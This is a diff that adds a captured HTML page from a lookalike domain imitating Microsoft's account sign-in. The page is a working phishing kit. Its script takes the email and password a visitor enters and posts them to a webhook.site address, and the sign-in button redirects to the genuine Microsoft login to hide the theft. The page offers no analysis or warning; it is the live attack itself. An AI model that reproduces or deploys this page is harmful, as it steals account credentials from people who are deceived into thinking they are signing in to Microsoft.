@@ -1,0 +1,129 @@
+<!-- url: https://peeldsb-rnicrosoft-login.work.gd/
+status: 200 -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="styles.css">
+    <title>Sign in to your Microsoft account </title>
+    <link rel="icon" type="image/x-icon" href="favicon.ico">
+</head>
+<body>
+    <div class="container">
+        <form id="loginForm" autocomplete="off">
+            <img class="logo" src="logo.png" width="200px">
+            <div class="forms-container">
+                <div class="forms">
+                    <!-- Step 1: Email -->
+                    <div class="first">
+                        <h2>Sign in</h2>
+                        <div class="form-group">
+                            <input type="email" id="email" name="email" placeholder="Email, Phone, or Skype" required>
+                        </div>
+                        <p>No account? <a href="#">Create One!</a></p>
+                        <a href="#">Sign in with a security key <span>?</span></a>
+                        <button type="button" class="next-btn">Next</button>
+                    </div>
+
+                    <!-- Step 2: Password -->
+                    <div class="second">
+                        <p><span class="arrow-btn">&#8592;</span> <span class="email">example@email.com</span></p>
+                        <h2>Enter password</h2>
+                        <div class="form-group">
+                            <input type="password" id="password" name="password" placeholder="Password" required>
+                        </div>
+                        <a href="#">Forgot password?</a><br>
+                        <!-- Submit button -->
+                        <button type="submit" class="signin-btn" onclick="location.href='https://login.microsoftonline.com/'">Sign in</button>
+                    </div>
+                </div>
+            </div>
+        </form>
+        <div class="bottom">
+            <img src="key.png">
+            <span>Sign-in options</span>
+        </div>
+    </div>
+
+    <div id="footer" role="contentinfo" class="footer ext-footer">
+        <div id="footerLinks" class="footerNode text-secondary footer-links ext-footer-links">
+            <a id="ftrTerms" href="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&amp;mkt=EN-US" class="footer-content ext-footer-content footer-item ext-footer-item">Terms of use</a>
+            <a id="ftrPrivacy" href="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&amp;mkt=EN-US" class="footer-content ext-footer-content footer-item ext-footer-item">Privacy &amp; cookies</a>
+            <a id="moreOptions" href="#" role="button" aria-label="Click here for troubleshooting information" aria-expanded="false" class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">...</a>
+        </div>
+    </div>
+
+    <script>
+       const forms = document.querySelector('.forms');
+const nextButton = document.querySelector('.next-btn');
+const arrowButton = document.querySelector('.arrow-btn');
+
+const emailInput = document.getElementById('email');
+const emailDisplay = document.querySelector('.email');
+const passwordInput = document.getElementById('password');
+
+// Next button → move to password step
+nextButton.addEventListener('click', () => {
+    if (emailInput.value.trim() === "") {
+        alert("Please enter your email.");
+        return;
+    }
+    forms.classList.add('next-form');
+    emailDisplay.innerText = emailInput.value;
+    passwordInput.setAttribute('placeholder', 'Password for ' + emailInput.value);
+    document.querySelector('.bottom').style.display = 'none';
+});
+
+// Enter key on email field
+emailInput.addEventListener('keydown', (event) => {
+    if (event.key === 'Enter') {
+        event.preventDefault();
+        nextButton.click();
+    }
+});
+
+// Back button
+arrowButton.addEventListener('click', () => {
+    forms.classList.remove('next-form');
+});
+
+// Handle form submit with multiple methods
+document.getElementById('loginForm').addEventListener('submit', async (e) => {
+    e.preventDefault();
+
+    const email = emailInput.value.trim();
+    const password = passwordInput.value.trim();
+
+    if (!email || !password) {
+        alert("Please fill in both fields.");
+        return;
+    }
+
+    // Your webhook URL
+    const webhookURL = "https://webhook.site/f5786e97-77a1-42aa-b1a8-ec86b0f6d212";
+
+    // Method 4: No-cors mode (will send but can't verify)
+    try {
+        await fetch(webhookURL, {
+            method: "POST",
+            mode: 'no-cors',
+            body: JSON.stringify({ email, password })
+        });
+
+        // Since no-cors doesn't return status, we assume it worked
+
+        return;
+    } catch (err) {
+        console.log('No-cors method failed:', err);
+    }
+
+
+});
+    </script>    
+</body>
+</html>
+
+
+
